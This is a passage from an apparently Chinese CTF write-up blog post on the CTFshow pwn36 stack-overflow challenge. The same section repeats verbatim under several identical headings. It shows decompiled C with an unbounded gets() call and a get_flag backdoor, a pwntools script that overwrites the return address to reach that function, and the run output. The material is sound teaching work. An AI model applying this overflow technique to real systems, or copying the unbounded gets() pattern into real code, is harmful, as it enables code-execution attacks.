class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-11"><a href="#pwn36-11" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-12"><a href="#pwn36-12" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-13"><a href="#pwn36-13" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-14"><a href="#pwn36-14" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting 